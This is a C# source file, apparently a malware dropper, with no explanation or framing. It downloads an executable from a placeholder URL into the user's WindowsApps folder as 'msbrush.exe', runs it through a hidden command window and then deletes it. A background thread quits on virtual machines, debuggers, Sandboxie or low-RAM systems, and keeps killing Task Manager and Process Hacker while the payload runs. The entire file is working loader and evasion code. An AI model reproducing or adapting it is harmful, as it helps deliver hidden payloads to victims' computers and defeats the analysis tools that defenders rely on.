using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;

class Program
{
    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    private readonly static List<string> ProcessName = new List<string> { "ProcessHacker", "taskmgr" };
    private static bool blocker = false;

    static void Main(string[] args)
    {
        string UN = System.Environment.UserName;

        new Thread(() =>
        {
            AV();
        }).Start();

        try
        {

            WebClient webClient = new WebClient();
            webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; " + "Windows NT 5.2; .NET CLR 1.0.3705;)");
            webClient.DownloadFile("URL", @"C:\\Users\\" + UN + "\\AppData\\Local\\Microsoft\\WindowsApps\\msbrush.exe");

        }
        catch (WebException ex)
        {
            Console.WriteLine("Message is " + ex.Message);

        }
        try
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.Start();

            cmd.StandardInput.WriteLine("C:\\Users\\" + UN + "\\AppData\\Local\\Microsoft\\WindowsApps\\msbrush.exe");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
            Thread.Sleep(2000);
            string file = @"C:\\Users\\" + UN + "\\AppData\\Local\\Microsoft\\WindowsApps\\msbrush.exe";
            File.Delete(file);
            blocker = true;

        }
        catch (WebException ex)
        {
            Console.WriteLine("Message is " + ex.Message);

        }
    }


    public static void AV()
    {
        if (DV() || DB() || DS() || Ram())
            Environment.FailFast(null);

        while (true)
        {
            DP();
            Thread.Sleep(10);
            if (blocker)
            {
                break;
            }
        }
    }

    private static bool DV()
    {
        using (var search = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
        {
            using (var things = search.Get())
            {
                foreach (var thing in things)
                {
                    string manufacturer = thing["Manufacturer"].ToString().ToLower();
                    if ((manufacturer == "microsoft corporation" && thing["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                        || manufacturer.Contains("vmware")
                        || thing["Model"].ToString() == "VirtualBox")
                    {
                        return true;
                    }
                }
            }
        }
        return false;
    }

    private static bool DB()
    {
        bool isdebug = false;
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isdebug);
        return isdebug;
    }

    private static bool DS()
    {
        if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
            return true;
        else
            return false;
    }

    private static bool Ram()
    {
        long memKb;
        GetPhysicallyInstalledSystemMemory(out memKb);
        long ram = (memKb / 1024 / 1024);
        if (ram < 4)
            return true;
        else
            return false;
    }

    private static void DP()
    {
        foreach (Process process in Process.GetProcesses())
        {
            try
            {
                if (ProcessName.Contains(process.ProcessName))
                    process.Kill();
            }
            catch { }
        }
    }

}

